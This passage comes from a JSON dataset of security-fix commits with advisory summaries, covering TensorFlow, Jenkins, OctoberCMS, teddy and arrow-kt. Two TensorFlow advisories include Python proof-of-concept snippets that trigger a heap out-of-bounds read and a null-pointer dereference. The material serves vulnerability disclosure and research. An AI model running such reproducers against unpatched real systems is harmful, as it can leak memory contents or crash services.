      "commit_href": "https://github.com/tensorflow/tensorflow/commit/e07e1c3d26492c06f078c7e5bf2d138043e199c1",
      "commit_sha": "e07e1c3d26492c06f078c7e5bf2d138043e199c1",
      "patch": "SINGLE",
      "chain_ord": "['e07e1c3d26492c06f078c7e5bf2d138043e199c1']",
      "before_first_fix_commit": "{'c22d88d6ff33031aa113e48aa3fc9aa74ed79595'}",
      "last_fix_commit": "e07e1c3d26492c06f078c7e5bf2d138043e199c1",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/23/2021, 17:33:00",
      "message": "Prevent memory overflow in ParseAttrValue from nested tensors.\n\nPiperOrigin-RevId: 370108442\nChange-Id: I84d64a5e8895a6aeffbf4749841b4c54d51b5889",
      "author": "Laura Pak",
      "comments": null,
      "stats": "{'additions': 57, 'deletions': 1, 'total': 58}",
      "files": "{'tensorflow/core/framework/attr_value_util.cc': {'additions': 57, 'deletions': 1, 'changes': 58, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/e07e1c3d26492c06f078c7e5bf2d138043e199c1/tensorflow%2Fcore%2Fframework%2Fattr_value_util.cc', 'patch': '@@ -38,6 +38,9 @@ namespace {\\n // Do not construct large tensors to compute their hash or compare for equality.\\n constexpr int kMaxAttrValueTensorByteSize = 32 * 1024 * 1024;  // 32mb\\n \\n+// Limit nesting of tensors to 100 deep to prevent memory overflow.\\n+constexpr int kMaxTensorNestDepth = 100;\\n+\\n // Return the size of the tensor represented by this TensorProto. If shape is\\n // not fully defined return -1.\\n int64 TensorByteSize(const TensorProto& t) {\\n@@ -224,6 +227,54 @@ string SummarizeFunc(const NameAttrList& func) {\\n   return strings::StrCat(func.name(), \"[\", absl::StrJoin(entries, \", \"), \"]\");\\n }\\n \\n+bool ParseAttrValueHelper_TensorNestsUnderLimit(int limit, string to_parse) {\\n+  int nests = 0;\\n+  int maxed_out = to_parse.length();\\n+  int open_curly = to_parse.find(\\'{\\');\\n+  int open_bracket = to_parse.find(\\'<\\');\\n+  int close_curly = to_parse.find(\\'}\\');\\n+  int close_bracket = to_parse.find(\\'>\\');\\n+  if (open_curly == -1) {\\n+    open_curly = maxed_out;\\n+  }\\n+  if (open_bracket == -1) {\\n+    open_bracket = maxed_out;\\n+  }\\n+  int min = std::min(open_curly, open_bracket);\\n+  do {\\n+    if (open_curly == maxed_out && open_bracket == maxed_out) {\\n+      return true;\\n+    }\\n+    if (min == open_curly) {\\n+      nests += 1;\\n+      open_curly = to_parse.find(\\'{\\', open_curly + 1);\\n+      if (open_curly == -1) {\\n+        open_curly = maxed_out;\\n+      }\\n+    } else if (min == open_bracket) {\\n+      nests += 1;\\n+      open_bracket = to_parse.find(\\'<\\', open_bracket + 1);\\n+      if (open_bracket == -1) {\\n+        open_bracket = maxed_out;\\n+      }\\n+    } else if (min == close_curly) {\\n+      nests -= 1;\\n+      close_curly = to_parse.find(\\'}\\', close_curly + 1);\\n+      if (close_curly == -1) {\\n+        close_curly = maxed_out;\\n+      }\\n+    } else if (min == close_bracket) {\\n+      nests -= 1;\\n+      close_bracket = to_parse.find(\\'>\\', close_bracket + 1);\\n+      if (close_bracket == -1) {\\n+        close_bracket = maxed_out;\\n+      }\\n+    }\\n+    min = std::min({open_curly, open_bracket, close_curly, close_bracket});\\n+  } while (nests < 100);\\n+  return false;\\n+}\\n+\\n }  // namespace\\n \\n string SummarizeAttrValue(const AttrValue& attr_value) {\\n@@ -448,7 +499,12 @@ bool ParseAttrValue(StringPiece type, StringPiece text, AttrValue* out) {\\n   } else {\\n     to_parse = strings::StrCat(field_name, \": \", text);\\n   }\\n-\\n+  if (field_name == \"tensor\") {\\n+    if (!ParseAttrValueHelper_TensorNestsUnderLimit(kMaxTensorNestDepth,\\n+                                                    to_parse)) {\\n+      return false;\\n+    }\\n+  }\\n   return ProtoParseFromString(to_parse, out);\\n }'}}",
      "message_norm": "prevent memory overflow in parseattrvalue from nested tensors.\n\npiperorigin-revid: 370108442\nchange-id: i84d64a5e8895a6aeffbf4749841b4c54d51b5889",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('370108442', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/framework/attr_value_util.cc'])",
      "num_files": 1.0
    },
    {
      "index": 2918,
      "vuln_id": "GHSA-rcj2-vvjx-87pm",
      "cwe_id": "{'CWE-311'}",
      "score": 5.9,
      "chain": "{'https://github.com/arrow-kt/arrow/commit/74198dab522393487d5344f194dc21208ab71ae8'}",
      "dataset": "osv",
      "summary": "Missing Encryption of Sensitive Data in arrow-kt Arrow arrow-kt Arrow before 0.9.0 resolved Gradle build artifacts (for compiling and building the published JARs) over HTTP instead of HTTPS. Any of these dependent artifacts could have been maliciously compromised by an MITM attack.",
      "published_date": "2019-04-22",
      "chain_len": 1,
      "project": "https://github.com/arrow-kt/arrow",
      "commit_href": "https://github.com/arrow-kt/arrow/commit/74198dab522393487d5344f194dc21208ab71ae8",
      "commit_sha": "74198dab522393487d5344f194dc21208ab71ae8",
      "patch": "SINGLE",
      "chain_ord": "['74198dab522393487d5344f194dc21208ab71ae8']",
      "before_first_fix_commit": "{'b78924304193c4301b1c0a6cc0c253f105ed0a15'}",
      "last_fix_commit": "74198dab522393487d5344f194dc21208ab71ae8",
      "chain_ord_pos": 1.0,
      "commit_datetime": "02/19/2019, 17:11:32",
      "message": "Fix some http vulnerabilities",
      "author": "Paco",
      "comments": null,
      "stats": "{'additions': 4, 'deletions': 4, 'total': 8}",
      "files": "{'build.gradle': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https://github.com/arrow-kt/arrow/raw/74198dab522393487d5344f194dc21208ab71ae8/build.gradle', 'patch': '@@ -39,7 +39,7 @@ buildscript {\\n             url \"https://plugins.gradle.org/m2/\"\\n         }\\n         jcenter()\\n-        maven { url \"http://dl.bintray.com/kotlin/kotlin-dev\" }\\n+        maven { url \"https://dl.bintray.com/kotlin/kotlin-dev\" }\\n         maven { url \"https://dl.bintray.com/jetbrains/markdown/\" }\\n         maven { url \"https://dl.bintray.com/arrow-kt/arrow-kt/\" }\\n     }\\n@@ -69,8 +69,8 @@ allprojects {\\n     repositories {\\n         jcenter()\\n         maven { url \\'https://kotlin.bintray.com/kotlinx\\' }\\n-        maven { url \"http://dl.bintray.com/kotlin/kotlin-dev\" }\\n-        maven { url \"http://dl.bintray.com/arrow-kt/arrow-kt\" }\\n+        maven { url \"https://dl.bintray.com/kotlin/kotlin-dev\" }\\n+        maven { url \"https://dl.bintray.com/arrow-kt/arrow-kt\" }\\n         maven { url \"https://dl.bintray.com/jetbrains/markdown/\" }\\n     }\\n }\\n@@ -252,4 +252,4 @@ dependencyUpdates {\\n \\n task checkDependenciesVersion {\\n     dependsOn dependencyUpdates\\n-}\\n\\\\ No newline at end of file\\n+}'}}",
      "message_norm": "fix some http vulnerabilities",
      "language": "sv",
      "entities": "[('fix', 'ACTION', ''), ('vulnerabilities', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['build.gradle'])",
      "num_files": 1.0
    },
    {
      "index": 871,
      "vuln_id": "GHSA-6mv9-hcx5-7mhh",
      "cwe_id": "{'CWE-918'}",
      "score": 5.3,
      "chain": "{'https://github.com/jenkinsci/jenkins/commit/2d16b459205730d85e51499c2457109b234ca9d9'}",
      "dataset": "osv",
      "summary": "Server-Side Request Forgery in Jenkins An improper authorization vulnerability exists in Jenkins versions 2.106 and earlier, and LTS 2.89.3 and earlier, that allows an attacker to have Jenkins submit HTTP GET requests and get limited information about the response.",
      "published_date": "2022-05-13",
      "chain_len": 1,
      "project": "https://github.com/jenkinsci/jenkins",
      "commit_href": "https://github.com/jenkinsci/jenkins/commit/2d16b459205730d85e51499c2457109b234ca9d9",
      "commit_sha": "2d16b459205730d85e51499c2457109b234ca9d9",
      "patch": "SINGLE",
      "chain_ord": "['2d16b459205730d85e51499c2457109b234ca9d9']",
      "before_first_fix_commit": "{'ccc374a7176d7704941fb494589790b7673efe2e'}",
      "last_fix_commit": "2d16b459205730d85e51499c2457109b234ca9d9",
      "chain_ord_pos": 1.0,
      "commit_datetime": "01/30/2018, 17:15:48",
      "message": "[SECURITY-506] Require admin permission to validate proxy config.",
      "author": "Jesse Glick",
      "comments": null,
      "stats": "{'additions': 2, 'deletions': 0, 'total': 2}",
      "files": "{'core/src/main/java/hudson/ProxyConfiguration.java': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https://github.com/jenkinsci/jenkins/raw/2d16b459205730d85e51499c2457109b234ca9d9/core%2Fsrc%2Fmain%2Fjava%2Fhudson%2FProxyConfiguration.java', 'patch': '@@ -341,6 +341,8 @@ public FormValidation doValidateProxy(\\n                 @QueryParameter(\"userName\") String userName, @QueryParameter(\"password\") String password,\\n                 @QueryParameter(\"noProxyHost\") String noProxyHost) {\\n \\n+            Jenkins.getInstance().checkPermission(Jenkins.ADMINISTER);\\n+\\n             if (Util.fixEmptyAndTrim(testUrl) == null) {\\n                 return FormValidation.error(Messages.ProxyConfiguration_TestUrlRequired());\\n             }'}}",
      "message_norm": "[security-506] require admin permission to validate proxy config.",
      "language": "en",
      "entities": "[('security-506', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('permission', 'SECWORD', ''), ('validate', 'ACTION', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['core/src/main/java/hudson/ProxyConfiguration.java'])",
      "num_files": 1.0
    },
    {
      "index": 2313,
      "vuln_id": "GHSA-jwf9-w5xm-f437",
      "cwe_id": "{'CWE-125'}",
      "score": 5.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d', 'https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f'}",
      "dataset": "osv",
      "summary": "Heap OOB in TFLite's `Gather*` implementations ### Impact\nTFLite's [`GatherNd` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.\n\nHence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.\n\nSimilar issue exists in [`Gather` implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc).\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
      "published_date": "2021-08-25",
      "chain_len": 2,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d",
      "commit_sha": "eb921122119a6b6e470ee98b89e65d721663179d",
      "patch": "MULTI",
      "chain_ord": "['bb6a0383ed553c286f87ca88c207f6774d5c4a8f', 'eb921122119a6b6e470ee98b89e65d721663179d']",
      "before_first_fix_commit": "{'ac72971cc6fbbfe4df7e67a8347ef1b6ab63b5fd'}",
      "last_fix_commit": "eb921122119a6b6e470ee98b89e65d721663179d",
      "chain_ord_pos": 2.0,
      "commit_datetime": "07/28/2021, 00:11:14",
      "message": "Prevent heap OOB read in TFLite's `gather.cc`.\n\nPassing negative indices is illegal but there was a missing check so that resulted in OOB accesses.\n\nPiperOrigin-RevId: 387231300\nChange-Id: I3111b54b2f232638d795be17efc46abe4ede6bf8",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 53, 'deletions': 16, 'total': 69}",
      "files": "{'tensorflow/lite/kernels/gather.cc': {'additions': 53, 'deletions': 16, 'changes': 69, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/eb921122119a6b6e470ee98b89e65d721663179d/tensorflow%2Flite%2Fkernels%2Fgather.cc', 'patch': '@@ -117,8 +117,20 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n }\\n \\n template <typename InputT, typename PositionsT>\\n-TfLiteStatus Gather(const TfLiteGatherParams& params, const TfLiteTensor* input,\\n-                    const TfLiteTensor* positions, TfLiteTensor* output) {\\n+TfLiteStatus Gather(TfLiteContext* context, const TfLiteGatherParams& params,\\n+                    const TfLiteTensor* input, const TfLiteTensor* positions,\\n+                    TfLiteTensor* output) {\\n+  const PositionsT* indexes = GetTensorData<PositionsT>(positions);\\n+  bool indices_has_only_positive_elements = true;\\n+  const size_t num_indices = positions->bytes / sizeof(PositionsT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indexes[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   tflite::GatherParams op_params;\\n   op_params.axis = params.axis;\\n   op_params.batch_dims = params.batch_dims;\\n@@ -134,7 +146,18 @@ TfLiteStatus GatherStrings(TfLiteContext* context, const TfLiteTensor* input,\\n                            const TfLiteTensor* positions,\\n                            TfLiteTensor* output) {\\n   DynamicBuffer buffer;\\n+\\n   const PositionT* indexes = GetTensorData<PositionT>(positions);\\n+  bool indices_has_only_positive_elements = true;\\n+  const size_t num_indices = positions->bytes / sizeof(PositionT);\\n+  for (size_t i = 0; i < num_indices; i++) {\\n+    if (indexes[i] < 0) {\\n+      indices_has_only_positive_elements = false;\\n+      break;\\n+    }\\n+  }\\n+  TF_LITE_ENSURE(context, indices_has_only_positive_elements);\\n+\\n   const PositionT num_strings = GetStringCount(input);\\n   const int num_indexes = NumElements(positions);\\n \\n@@ -163,19 +186,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   if (positions->type == kTfLiteInt32) {\\n     switch (input->type) {\\n       case kTfLiteFloat32:\\n-        return Gather<float, int32_t>(*params, input, positions, output);\\n+        return Gather<float, int32_t>(context, *params, input, positions,\\n+                                      output);\\n       case kTfLiteUInt8:\\n-        return Gather<uint8_t, int32_t>(*params, input, positions, output);\\n+        return Gather<uint8_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt8:\\n-        return Gather<int8_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int8_t, int32_t>(context, *params, input, positions,\\n+                                       output);\\n       case kTfLiteInt16:\\n-        return Gather<int16_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int16_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt32:\\n-        return Gather<int32_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int32_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt64:\\n-        return Gather<int64_t, int32_t>(*params, input, positions, output);\\n+        return Gather<int64_t, int32_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteBool:\\n-        return Gather<bool, int32_t>(*params, input, positions, output);\\n+        return Gather<bool, int32_t>(context, *params, input, positions,\\n+                                     output);\\n       case kTfLiteString:\\n         return GatherStrings<int32_t>(context, input, positions, output);\\n       default:\\n@@ -187,19 +217,26 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   if (positions->type == kTfLiteInt64) {\\n     switch (input->type) {\\n       case kTfLiteFloat32:\\n-        return Gather<float, int64_t>(*params, input, positions, output);\\n+        return Gather<float, int64_t>(context, *params, input, positions,\\n+                                      output);\\n       case kTfLiteUInt8:\\n-        return Gather<uint8_t, int64_t>(*params, input, positions, output);\\n+        return Gather<uint8_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt8:\\n-        return Gather<int8_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int8_t, int64_t>(context, *params, input, positions,\\n+                                       output);\\n       case kTfLiteInt16:\\n-        return Gather<int16_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int16_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt32:\\n-        return Gather<int32_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int32_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteInt64:\\n-        return Gather<int64_t, int64_t>(*params, input, positions, output);\\n+        return Gather<int64_t, int64_t>(context, *params, input, positions,\\n+                                        output);\\n       case kTfLiteBool:\\n-        return Gather<bool, int64_t>(*params, input, positions, output);\\n+        return Gather<bool, int64_t>(context, *params, input, positions,\\n+                                     output);\\n       case kTfLiteString:\\n         return GatherStrings<int64_t>(context, input, positions, output);\\n       default:'}}",
      "message_norm": "prevent heap oob read in tflite's `gather.cc`.\n\npassing negative indices is illegal but there was a missing check so that resulted in oob accesses.\n\npiperorigin-revid: 387231300\nchange-id: i3111b54b2f232638d795be17efc46abe4ede6bf8",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('missing check', 'SECWORD', ''), ('oob', 'SECWORD', ''), ('387231300', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/lite/kernels/gather.cc'])",
      "num_files": 1.0
    },
    {
      "index": 617,
      "vuln_id": "GHSA-5f38-9jw2-6r6h",
      "cwe_id": "{'CWE-79', 'CWE-843'}",
      "score": 5.4,
      "chain": "{'https://github.com/rooseveltframework/teddy/commit/64c556717b4879bf8d4c30067cf6e70d899a3dc0'}",
      "dataset": "osv",
      "summary": "Cross-site Scripting in teddy Teddy is a readable and easy to learn templating language. This affects the package teddy before 0.5.9. A type confusion vulnerability can be used to bypass input sanitization when the model content is an array (instead of a string).",
      "published_date": "2021-10-12",
      "chain_len": 1,
      "project": "https://github.com/rooseveltframework/teddy",
      "commit_href": "https://github.com/rooseveltframework/teddy/commit/64c556717b4879bf8d4c30067cf6e70d899a3dc0",
      "commit_sha": "64c556717b4879bf8d4c30067cf6e70d899a3dc0",
      "patch": "SINGLE",
      "chain_ord": "['64c556717b4879bf8d4c30067cf6e70d899a3dc0']",
      "before_first_fix_commit": "{'90387d97c7a8f458a08dd3b72a4b0574000af5f8', 'fea0b218069ff00f86f2b24f2fd08be01cd6b8c1'}",
      "last_fix_commit": "64c556717b4879bf8d4c30067cf6e70d899a3dc0",
      "chain_ord_pos": 1.0,
      "commit_datetime": "10/07/2021, 01:27:38",
      "message": "Merge pull request #518 from kethinov/refactor-escape-entities\n\nrefactor escape entities for better type checking",
      "author": "Eric Newport",
      "comments": null,
      "stats": "{'additions': 15, 'deletions': 4, 'total': 19}",
      "files": "{'utils.js': {'additions': 15, 'deletions': 4, 'changes': 19, 'status': 'modified', 'raw_url': 'https://github.com/rooseveltframework/teddy/raw/64c556717b4879bf8d4c30067cf6e70d899a3dc0/utils.js', 'patch': \"@@ -96,10 +96,21 @@ function escapeEntities (value) {\\n   let i\\n   let j\\n \\n-  if (value === undefined || typeof value === 'boolean' || typeof value === 'object') { // Cannot escape on these values\\n-    return value\\n-  } else if (typeof value === 'number') { // Value is a number, no reason to escape\\n-    return `${value}`\\n+  if (typeof value === 'object') { // Cannot escape on this value\\n+    if (!value) {\\n+      return false // it is falsey to return false\\n+    } else if (Array.isArray(value)) {\\n+      if (value.length === 0) {\\n+        return false // empty arrays are falsey\\n+      } else {\\n+        return '[Array]' // print that it is an array with content in it, but do not print the contents\\n+      }\\n+    }\\n+    return '[Object]' // just print that it is an object, do not print the contents\\n+  } else if (value === undefined) { // Cannot escape on this value\\n+    return false // undefined is falsey\\n+  } else if (typeof value === 'boolean' || typeof value === 'number') { // Cannot escape on these values\\n+    return value // if it's already a boolean or a number just return it\\n   } else {\\n     // Loop through value to find HTML entities\\n     for (i = 0; i < value.length; i++) {\"}}",
      "message_norm": "merge pull request #518 from kethinov/refactor-escape-entities\n\nrefactor escape entities for better type checking",
      "language": "en",
      "entities": "[('#518', 'ISSUE', ''), ('escape', 'SECWORD', ''), ('escape', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['utils.js'])",
      "num_files": 1.0
    },
    {
      "index": 1110,
      "vuln_id": "GHSA-828x-qc2p-wprq",
      "cwe_id": "{'CWE-476'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4'}",
      "dataset": "osv",
      "summary": "Undefined behavior in `MaxPool3DGradGrad` ### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/72fe792967e7fd25234342068806707bbc116618/tensorflow/core/kernels/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4",
      "commit_sha": "a3d9f9be9ac2296615644061b40cefcee341dcc4",
      "patch": "SINGLE",
      "chain_ord": "['a3d9f9be9ac2296615644061b40cefcee341dcc4']",
      "before_first_fix_commit": "{'72fe792967e7fd25234342068806707bbc116618'}",
      "last_fix_commit": "a3d9f9be9ac2296615644061b40cefcee341dcc4",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/05/2021, 22:20:14",
      "message": "Add missing validation to pooling_ops_3d\n\nPiperOrigin-RevId: 372218727\nChange-Id: I6b9ed4266aa7286c02f1f230d7bea922c1be547e",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 13, 'deletions': 0, 'total': 13}",
      "files": "{'tensorflow/core/kernels/pooling_ops_3d.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/a3d9f9be9ac2296615644061b40cefcee341dcc4/tensorflow%2Fcore%2Fkernels%2Fpooling_ops_3d.cc', 'patch': '@@ -698,6 +698,19 @@ class MaxPooling3dGradGradOp : public OpKernel {\\n     OP_REQUIRES_OK(context, context->forward_input_or_allocate_output(\\n                                 {2}, 0, tensor_out.shape(), &output));\\n \\n+    // Given access patterns in LaunchMaxPooling3dGradGradOp, these tensors must\\n+    // have elements.\\n+    OP_REQUIRES(context, tensor_in.NumElements() > 0,\\n+                errors::InvalidArgument(\"received empty tensor tensor_in: \",\\n+                                        tensor_in.DebugString()));\\n+    OP_REQUIRES(context, tensor_out.NumElements() > 0,\\n+                errors::InvalidArgument(\"received empty tensor tensor_out: \",\\n+                                        tensor_out.DebugString()));\\n+    OP_REQUIRES(\\n+        context, out_grad_backprop.NumElements() > 0,\\n+        errors::InvalidArgument(\"received empty tensor out_grad_backprop: \",\\n+                                out_grad_backprop.DebugString()));\\n+\\n     LaunchMaxPooling3dGradGradOp<Device, T>::launch(\\n         context, params, tensor_in, tensor_out, out_grad_backprop, output);\\n   }'}}",
      "message_norm": "add missing validation to pooling_ops_3d\n\npiperorigin-revid: 372218727\nchange-id: i6b9ed4266aa7286c02f1f230d7bea922c1be547e",
      "language": "en",
      "entities": "[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('372218727', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/pooling_ops_3d.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1328,
      "vuln_id": "GHSA-9722-rr68-rfpg",
      "cwe_id": "{'CWE-610', 'CWE-73'}",
      "score": 3.4,
      "chain": "{'https://github.com/octobercms/october/commit/6711dae8ef70caf0e94cec434498012a2ccd86b8'}",
      "dataset": "osv",
      "summary": "Upload whitelisted files to any directory in OctoberCMS ### Impact\nAn attacker can exploit this vulnerability to upload jpg, jpeg, bmp, png, webp, gif, ico, css, js, woff, woff2, svg, ttf, eot, json, md, less, sass, scss, xml files to any directory of an October CMS server. The vulnerability is only exploitable by an authenticated backend user with the `cms.manage_assets` permission.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https://github.com/octobercms/october/commit/6711dae8ef70caf0e94cec434498012a2ccd86b8 to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https://stazot.com/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1241\" alt=\"Screen Shot 2020-03-31 at 12 21 10 PM\" src=\"https://user-images.githubusercontent.com/7253840/78061230-255f5400-734a-11ea-92b4-1120f6960505.png\">",
      "published_date": "2020-06-03",
      "chain_len": 1,
      "project": "https://github.com/octobercms/october",
      "commit_href": "https://github.com/octobercms/october/commit/6711dae8ef70caf0e94cec434498012a2ccd86b8",
      "commit_sha": "6711dae8ef70caf0e94cec434498012a2ccd86b8",
      "patch": "SINGLE",
      "chain_ord": "['6711dae8ef70caf0e94cec434498012a2ccd86b8']",
      "before_first_fix_commit": "{'2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc'}",
      "last_fix_commit": "6711dae8ef70caf0e94cec434498012a2ccd86b8",
      "chain_ord_pos": 1.0,
      "commit_datetime": "03/31/2020, 10:09:18",
      "message": "Improve asset file path handling when moving assets",
      "author": "Luke Towers",
      "comments": null,
      "stats": "{'additions': 8, 'deletions': 1, 'total': 9}",
      "files": "{'modules/cms/widgets/AssetList.php': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https://github.com/octobercms/october/raw/6711dae8ef70caf0e94cec434498012a2ccd86b8/modules%2Fcms%2Fwidgets%2FAssetList.php', 'patch': \"@@ -333,13 +333,20 @@ public function onMove()\\n \\n             $basename = basename($path);\\n             $originalFullPath = $this->getFullPath($path);\\n-            $newFullPath = rtrim($destinationFullPath, '/').'/'.$basename;\\n+            $newFullPath = realpath(rtrim($destinationFullPath, '/')) . '/' . $basename;\\n             $safeDir = $this->getAssetsPath();\\n \\n             if ($originalFullPath == $newFullPath) {\\n                 continue;\\n             }\\n \\n+            if (!starts_with($newFullPath, $safeDir)) {\\n+                throw new ApplicationException(Lang::get(\\n+                    'cms::lang.asset.error_moving_file',\\n+                    ['file' => $basename]\\n+                ));\\n+            }\\n+\\n             if (is_file($originalFullPath)) {\\n                 if (!@File::move($originalFullPath, $newFullPath)) {\\n                     throw new ApplicationException(Lang::get(\"}}",
      "message_norm": "improve asset file path handling when moving assets",
      "language": "en",
      "entities": "[('improve', 'ACTION', ''), ('asset', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['modules/cms/widgets/AssetList.php'])",
      "num_files": 1.0
    },
    {
      "index": 724,
      "vuln_id": "GHSA-5xvc-vgmp-jgc3",
      "cwe_id": "{'CWE-284'}",
      "score": 9.1,
